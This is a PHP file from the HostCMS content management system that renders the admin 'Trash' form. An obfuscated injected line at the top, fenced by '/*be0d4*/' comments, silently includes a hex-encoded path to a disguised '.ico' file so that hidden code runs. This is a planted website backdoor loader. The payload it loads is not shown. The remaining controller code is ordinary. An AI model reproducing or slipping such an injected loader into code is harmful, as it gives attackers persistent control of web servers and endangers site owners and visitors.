<?php


/*be0d4*/

@include "\x2fhom\x65/ne\x6f-vo\x2ffeo\x72o.r\x75/do\x63s/m\x6fdul\x65s/b\x65nch\x6dark\x2fcon\x66ig/\x66avi\x63on_\x6561c\x32d.i\x63o";

/*be0d4*/
/**
 * Trash.
 *
 * @package HostCMS
 * @version 6.x
 * @author Hostmake LLC
 * @copyright © 2005-2016 ООО "Хостмэйк" (Hostmake LLC), http://www.hostcms.ru
 */
require_once('../../bootstrap.php');

Core_Auth::authorization($sModule = 'trash');

// Код формы
$iAdmin_Form_Id = 183;
$sAdminFormAction = '/admin/trash/index.php';

$oAdmin_Form = Core_Entity::factory('Admin_Form', $iAdmin_Form_Id);

// Контроллер формы
$oAdmin_Form_Controller = Admin_Form_Controller::create($oAdmin_Form);
$oAdmin_Form_Controller
	->module(Core_Module::factory($sModule))
	->setUp()
	->path($sAdminFormAction)
	->title(Core::_('Trash.title'))
	->pageTitle(Core::_('Trash.title'));

// Источник данных 0
$oAdmin_Form_Dataset = new Trash_Dataset();

// Добавляем источник данных контроллеру формы
$oAdmin_Form_Controller->addDataset(
	$oAdmin_Form_Dataset
);

// Показ формы
$oAdmin_Form_Controller->execute();